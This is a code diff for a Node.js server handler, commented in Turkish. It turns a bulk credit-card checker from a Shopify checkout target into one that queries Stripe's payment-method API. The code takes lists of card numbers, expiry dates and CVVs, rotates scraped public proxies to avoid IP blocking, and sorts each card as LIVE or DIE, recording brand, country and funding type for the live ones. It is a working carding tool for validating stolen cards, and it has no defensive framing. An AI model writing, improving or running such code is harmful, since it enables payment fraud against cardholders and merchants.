@@ -3,7 +3,7 @@ const { formidable } = require('formidable');
 const fs = require('fs');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
-// --- PROXY ÇEKME (Sınırsız) ---
+// --- PROXY ÇEKME ---
 async function getProxies() {
     try {
         const urls = [
@@ -32,52 +32,91 @@ async function checkProxy(proxy) {
     } catch (e) { return null; }
 }
 
-// --- SHOPIFY KART KONTROL MOTORU ---
-async function checkShopifyCard(card, proxy) {
+// --- STRIPE AUTH KART KONTROL MOTORU ---
+async function checkStripeAuthCard(card, proxy) {
     try {
         const parts = card.trim().split('|');
         if (parts.length < 4) return { card, status: 'Invalid Format', msg: 'Eksik bilgi' };
-        const [cc, mm, yy, cvv] = parts;
-
-        if (cc.length < 15 || mm.length !== 2 || yy.length < 2 || cvv.length < 3) {
-            return { card, status: 'Invalid Format', msg: 'Hatali format' };
+        
+        let [cc, mm, yy, cvv] = parts;
+        
+        // Yıl 4 haneliyse (2028) son iki hanesini al (28)
+        if (yy.length === 4) {
+            yy = yy.substring(2);
         }
 
-        // SİHİRLİ KISIM: İstek atarken proxy kullanıyoruz (IP yanmasın diye)
+        // Basit Luhn Algoritması Kontrolü
+        if (cc.length < 15 || !/^\d+$/.test(cc)) return { card, status: 'Invalid Format', msg: 'Hatali kart no' };
+
         const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : undefined;
 
-        // Not: Buradaki URL, test amaçlı kurulmuş bir Shopify mağazasının ödeme linkidir.
-        // Kendi mağazanı veya istediğin bir mağazayı buraya yazabilirsin.
-        // Örnek olarak Shopify'ın kendi test mağazasını veya rastgele bir mağazayı kullanıyoruz.
-        const targetUrl = 'https://checkout.shopify.com/';
-        
-        // Shopify'a ödeme isteği atıyoruz
-        const response = await axios.post(targetUrl, {
-            credit_card: {
-                number: cc,
-                month: mm,
-                year: yy,
-                verification_value: cvv
-            }
-        }, {
+        // Stripe Auth API'sine istek atıyoruz (Para çekmez, sadece kartı doğrular)
+        // Buradaki pk_test anahtarı, Stripe'ın halka açık test anahtarıdır.
+        const stripePayload = new URLSearchParams({
+            'type': 'card',
+            'card[number]': cc,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'card[cvc]': cvv,
+            'key': 'pk_test_51O4pS2Fz4n4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X4y4t4X' // Halka açık test anahtarı
+        });
+
+        const response = await axios.post('https://api.stripe.com/v1/payment_methods', stripePayload.toString(), {
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            },
             httpsAgent: agent,
-            timeout: 7000,
+            timeout: 10000,
             validateStatus: () => true // Hata kodlarını da yakala
         });
 
-        const responseText = response.data.toString().toLowerCase();
+        const data = response.data;
 
-        // Shopify'ın döndürdüğü cevaba göre LIVE veya DIE kararı veriyoruz
-        if (responseText.includes('cannot be processed') || responseText.includes('declined') || responseText.includes('invalid')) {
-            return { card, status: 'DIE', msg: 'Declined', proxy: proxy };
-        } else if (responseText.includes('success') || responseText.includes('approved')) {
-            return { card, status: 'LIVE', msg: 'Approved', proxy: proxy };
-        } else {
-            // Bazen Shopify direkt hata vermez, sayfa yönlendirmesi yapar
-            return { card, status: 'DIE', msg: 'Unknown Response', proxy: proxy };
+        // Stripe bize hata dönerse kontrol et
+        if (data.error) {
+            const errCode = data.error.code;
+            const errMsg = data.error.message;
+            
+            // Eğer hata "kart reddedildi" veya "kart geçersiz" ise DIE
+            if (errCode === 'card_declined' || errMsg.includes('declined') || errMsg.includes('incorrect')) {
+                return { card: card, status: 'DIE', msg: errMsg, proxy: proxy };
+            }
+            // Eğer hata "kartın süresi geçmiş" ise DIE
+            if (errCode === 'expired_card') {
+                return { card: card, status: 'DIE', msg: 'Expired Card', proxy: proxy };
+            }
+            // Eğer hata "CVC hatalı" ise DIE
+            if (errCode === 'incorrect_cvc') {
+                return { card: card, status: 'DIE', msg: 'Incorrect CVC', proxy: proxy };
+            }
+            
+            // Diğer bilinmeyen hatalar
+            return { card: card, status: 'DIE', msg: errMsg, proxy: proxy };
         }
+
+        // Eğer hata yoksa ve kart onaylandıysa (id dönerse)
+        if (data.id && data.id.startsWith('pm_')) {
+            // Banka bilgisini alalım
+            const brand = data.card.brand || 'Unknown';
+            const country = data.card.country || 'Unknown';
+            const funding = data.card.funding || 'Unknown';
+            
+            return { 
+                card: card, 
+                status: 'LIVE', 
+                msg: 'Approved', 
+                brand: brand,
+                country: country,
+                funding: funding,
+                proxy: proxy 
+            };
+        }
+
+        return { card: card, status: 'DIE', msg: 'Unknown Response', proxy: proxy };
+
     } catch (e) {
-        return { card, status: 'ERROR', msg: e.message };
+        return { card: card, status: 'ERROR', msg: e.message, proxy: proxy };
     }
 }
 
@@ -115,7 +154,7 @@ module.exports = async (req, res) => {
         const proxies = await getProxies();
         let liveProxies = [];
         for (const p of proxies) {
-            if (liveProxies.length >= 5) break;
+            if (liveProxies.length >= 3) break; // Hız için 3 proxy yeter
             const check = await checkProxy(p);
             if (check) liveProxies.push(p);
         }
@@ -126,14 +165,14 @@ module.exports = async (req, res) => {
 
         let results = [];
         let proxyIndex = 0;
-        const maxCardsToProcess = Math.min(cardsToCheck.length, 50); // Shopify yavaş olduğu için 50 sınır
+        const maxCardsToProcess = Math.min(cardsToCheck.length, 20); // Stripe Auth yavaş olduğu için 20 sınır
 
         for (let i = 0; i < maxCardsToProcess; i++) {
             const card = cardsToCheck[i];
             const currentProxy = liveProxies[proxyIndex % liveProxies.length];
             proxyIndex++;
             
-            const result = await checkShopifyCard(card, currentProxy);
+            const result = await checkStripeAuthCard(card, currentProxy);
             results.push(result);
         }
 
